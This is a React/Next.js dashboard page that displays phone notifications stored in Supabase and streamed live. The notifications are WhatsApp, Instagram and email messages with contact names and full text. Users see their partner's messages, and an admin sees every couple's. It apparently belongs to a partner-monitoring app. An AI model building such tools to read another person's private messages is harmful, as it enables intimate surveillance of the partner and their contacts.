'use client'

import { useEffect, useState, useCallback } from 'react'
import {
  supabase,
  getNotificationLogs,
  NotificationLog,
  Couple,
  getAllCouples,
} from '@/lib/supabase'

const APP_EMOJI: Record<string, string> = {
  'com.whatsapp': '💬',
  'com.instagram.android': '📸',
  'com.twitter.android': '🐦',
  'com.facebook.katana': '👍',
  'com.facebook.orca': '💙',
  'com.snapchat.android': '👻',
  'com.google.android.gm': '📧',
  'com.spotify.music': '🎵',
  'com.netflix.mediaclient': '🎬',
}

function appEmoji(pkg: string) { return APP_EMOJI[pkg] ?? '🔔' }

function fmt(iso: string) {
  return new Date(iso).toLocaleString('es', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
  })
}

function timeAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime()
  const m = Math.floor(diff / 60000)
  if (m < 1)  return 'Ahora'
  if (m < 60) return `${m}m`
  const h = Math.floor(m / 60)
  if (h < 24) return `${h}h`
  return `${Math.floor(h / 24)}d`
}

const PER_PAGE = 30

export default function NotificationsPage() {
  const [logs, setLogs] = useState<NotificationLog[]>([])
  const [total, setTotal] = useState(0)
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState('')
  const [coupleId, setCoupleId] = useState('')
  const [couples, setCouples] = useState<Couple[]>([])
  const [page, setPage] = useState(0)
  const [selected, setSelected] = useState<NotificationLog | null>(null)
  const [liveCount, setLiveCount] = useState(0)

  const [session, setSession] = useState<{
    isAdmin: boolean
    coupleId: string | null
    username: string
    coupleName: string
  } | null>(null)

  useEffect(() => {
    fetch('/api/auth/me')
      .then(r => r.json())
      .then(d => {
        if (d.session) {
          setSession(d.session)
          if (!d.session.isAdmin && d.session.coupleId) {
            setCoupleId(d.session.coupleId)
          }
        }
      })
      .catch(() => {})
  }, [])

  useEffect(() => {
    if (session?.isAdmin) {
      getAllCouples().then(setCouples).catch(() => {})
    }
  }, [session])

  const load = useCallback(async () => {
    setLoading(true)
    try {
      const res = await getNotificationLogs({
        coupleId: coupleId || undefined,
        appName:  search   || undefined,
        limit:    PER_PAGE,
        offset:   page * PER_PAGE,
      })
      setLogs(res.data)
      setTotal(res.count)
    } finally {
      setLoading(false)
    }
  }, [coupleId, search, page])

  useEffect(() => {
    if (session) {
      load()
    }
  }, [session, load])

  useEffect(() => {
    if (!session) return

    const channelName = session.isAdmin
      ? 'admin_notif_realtime'
      : `couple_notif_realtime_${session.coupleId}`

    const channel = supabase
      .channel(channelName)
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'notification_logs',
        ...(session.isAdmin ? {} : { filter: `couple_id=eq.${session.coupleId}` })
      }, (payload) => {
        const newLog = payload.new as NotificationLog
        if (session.isAdmin && coupleId && newLog.couple_id !== coupleId) {
          return
        }
        setLiveCount(c => c + 1)
        setLogs(prev => [newLog, ...prev].slice(0, PER_PAGE))
        setTotal(t => t + 1)
      })
      .subscribe()

    return () => { supabase.removeChannel(channel) }
  }, [session, coupleId])

  const totalPages = Math.ceil(total / PER_PAGE)

  return (
    <div className="flex flex-col lg:flex-row h-full min-h-[calc(100vh-60px)] md:min-h-screen overflow-hidden">

      {/* ── Columna principal ── */}
      <div className="flex-1 flex flex-col min-w-0 overflow-hidden">

        {/* Header */}
        <div className="p-3 sm:p-5 md:p-6 border-b border-[#D4AF5A]/20 bg-[#190407] shrink-0">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <p className="text-[9.5px] font-extrabold tracking-widest text-[#D4AF5A] uppercase mb-0.5">
                {session?.isAdmin ? 'REGISTRO EN TIEMPO REAL (ADMIN)' : `NOTIFICACIONES PRIVADAS • ${session?.coupleName}`}
              </p>
              <h1 className="text-xl sm:text-2xl font-black text-[#F7EFE4] tracking-tight">
                Notificaciones
              </h1>
              <p className="text-xs text-[#A89186]">
                {total.toLocaleString()} registros {session?.isAdmin ? 'totales' : 'de tu pareja'}
              </p>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-auto">
              {liveCount > 0 && (
                <div className="flex items-center gap-1.5 bg-[#D4AF5A]/15 border border-[#D4AF5A]/40 rounded-full px-2.5 py-1 text-xs">
                  <span className="w-2 h-2 rounded-full bg-[#4ade80] animate-pulse" />
                  <span className="font-bold text-[#F3E5AB]">+{liveCount} en vivo</span>
                </div>
              )}
              <button
                onClick={() => { setLiveCount(0); load() }}
                className="bg-[#D4AF5A] text-[#190407] rounded-xl px-3.5 py-1.5 text-xs font-black hover:bg-[#F3E5AB] transition-colors"
              >
                ↻ Actualizar
              </button>
            </div>
          </div>

          {/* Filtros */}
          <div className="flex flex-col sm:flex-row gap-2 mt-3.5">
            <input
              value={search}
              onChange={e => { setSearch(e.target.value); setPage(0) }}
              placeholder="Buscar app, contacto o texto..."
              className="flex-1 bg-[#2A080D] border border-[#D4AF5A]/30 rounded-xl px-3.5 py-2 text-xs sm:text-sm text-[#F7EFE4] placeholder-[#A89186] outline-none"
            />
            {session?.isAdmin && (
              <select
                value={coupleId}
                onChange={e => { setCoupleId(e.target.value); setPage(0) }}
                className="bg-[#2A080D] border border-[#D4AF5A]/30 rounded-xl px-3 py-2 text-xs sm:text-sm text-[#C7B7A3] outline-none cursor-pointer sm:min-w-[180px]"
              >
                <option value="">Todas las parejas</option>
                {couples.map(c => (
                  <option key={c.id} value={c.id}>{c.couple_names}</option>
                ))}
              </select>
            )}
          </div>
        </div>

        {/* Lista de Notificaciones */}
        <div className="flex-1 overflow-y-auto p-3 sm:p-5 space-y-2 pb-24">
          {loading ? (
            <div className="py-20 text-center text-xs sm:text-sm text-[#A89186]">Cargando notificaciones...</div>
          ) : logs.length === 0 ? (
            <div className="py-20 text-center">
              <p className="text-4xl mb-3">🔕</p>
              <p className="text-sm font-bold text-[#A89186]">No se encontraron notificaciones</p>
              <p className="text-xs text-[#A89186]/70 mt-1">Los mensajes entrantes de WhatsApp, Instagram, etc., aparecerán aquí.</p>
            </div>
          ) : (
            logs.map(log => {
              const isSel = selected?.id === log.id
              return (
                <div
                  key={log.id}
                  onClick={() => setSelected(log)}
                  className={`
                    p-3 sm:p-4 rounded-xl border cursor-pointer transition-all flex items-start gap-3
                    ${isSel
                      ? 'bg-[#D4AF5A]/15 border-[#D4AF5A] shadow-sm'
                      : 'bg-[#2A080D] border-[#D4AF5A]/15 hover:border-[#D4AF5A]/30'
                    }
                  `}
                >
                  <span className="text-xl sm:text-2xl shrink-0 pt-0.5">
                    {appEmoji(log.package_name)}
                  </span>

                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2 mb-0.5">
                      <span className="text-xs font-bold text-[#D4AF5A] truncate">
                        {log.app_name}
                      </span>
                      <span className="text-[10px] text-[#A89186] shrink-0 font-medium">
                        {timeAgo(log.received_at)}
                      </span>
                    </div>

                    {log.title && (
                      <p className="text-xs sm:text-sm font-extrabold text-[#F7EFE4] truncate">
                        {log.title}
                      </p>
                    )}

                    <p className="text-xs text-[#C7B7A3] line-clamp-2 mt-0.5 leading-relaxed">
                      {log.big_text || log.text || '(Sin texto previo)'}
                    </p>

                    {session?.isAdmin && (
                      <p className="text-[10px] text-[#A89186]/80 mt-1 truncate">
                        👤 {log.couples?.couple_names || 'Pareja'}
                      </p>
                    )}
                  </div>
                </div>
              )
            })
          )}
        </div>

        {/* Paginación */}
        {totalPages > 1 && (
          <div className="p-3 border-t border-[#D4AF5A]/20 bg-[#190407] flex items-center justify-between text-xs">
            <button
              disabled={page === 0}
              onClick={() => setPage(p => p - 1)}
              className="px-3 py-1.5 rounded-lg bg-[#2A080D] border border-[#D4AF5A]/30 text-[#EFE5D8] disabled:opacity-40"
            >
              ← Anterior
            </button>
            <span className="text-[#A89186]">
              Página {page + 1} de {totalPages}
            </span>
            <button
              disabled={page >= totalPages - 1}
              onClick={() => setPage(p => p + 1)}
              className="px-3 py-1.5 rounded-lg bg-[#2A080D] border border-[#D4AF5A]/30 text-[#EFE5D8] disabled:opacity-40"
            >
              Siguiente →
            </button>
          </div>
        )}
      </div>

      {/* ── Panel de Detalle (Modal en móvil, Side Panel en desktop) ── */}
      {selected && (
        <div className="fixed inset-0 z-50 lg:static lg:z-auto bg-black/75 backdrop-blur-sm lg:backdrop-blur-none lg:bg-transparent flex justify-end">
          <div className="w-full max-w-md lg:w-80 bg-[#2A080D] border-l border-[#D4AF5A]/30 p-5 sm:p-6 overflow-y-auto flex flex-col gap-4 shadow-2xl h-full">
            <div className="flex justify-between items-center border-b border-[#D4AF5A]/20 pb-3">
              <p className="text-[10px] font-extrabold tracking-widest text-[#D4AF5A] uppercase">
                DETALLE DE NOTIFICACIÓN
              </p>
              <button
                onClick={() => setSelected(null)}
                className="w-8 h-8 flex items-center justify-center rounded-lg bg-[#190407] text-[#A89186] text-sm hover:text-[#F7EFE4]"
              >
                ✕
              </button>
            </div>

            <div>
              <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">APLICACIÓN</p>
              <div className="flex items-center gap-2 mt-1">
                <span className="text-2xl">{appEmoji(selected.package_name)}</span>
                <div>
                  <p className="text-sm font-black text-[#F3E5AB]">{selected.app_name}</p>
                  <p className="text-[10px] text-[#A89186] truncate max-w-[200px]">{selected.package_name}</p>
                </div>
              </div>
            </div>

            {session?.isAdmin && (
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">PAREJA</p>
                <p className="text-xs font-bold text-[#EFE5D8] mt-0.5">
                  {(selected.couples as any)?.couple_names ?? '—'}
                </p>
              </div>
            )}

            {selected.title && (
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">CONTACTO / TÍTULO</p>
                <p className="text-sm font-extrabold text-[#F7EFE4] mt-0.5">{selected.title}</p>
              </div>
            )}

            {(selected.big_text || selected.text) && (
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">MENSAJE COMPLETO</p>
                <div className="mt-1 p-3 rounded-xl bg-[#190407] border border-[#D4AF5A]/20 text-xs sm:text-sm text-[#EFE5D8] leading-relaxed break-words whitespace-pre-wrap">
                  {selected.big_text || selected.text}
                </div>
              </div>
            )}

            {selected.sub_text && (
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">SUBTEXTO / INFO</p>
                <p className="text-xs text-[#C7B7A3] mt-0.5">{selected.sub_text}</p>
              </div>
            )}

            <div className="border-t border-[#D4AF5A]/15 pt-3 space-y-2 text-xs">
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">HORA RECIBIDA</p>
                <p className="text-[#EFE5D8] mt-0.5">{fmt(selected.received_at)}</p>
              </div>
              <div>
                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">REGISTRADA EN NUBE</p>
                <p className="text-[#A89186] mt-0.5">{fmt(selected.created_at)}</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
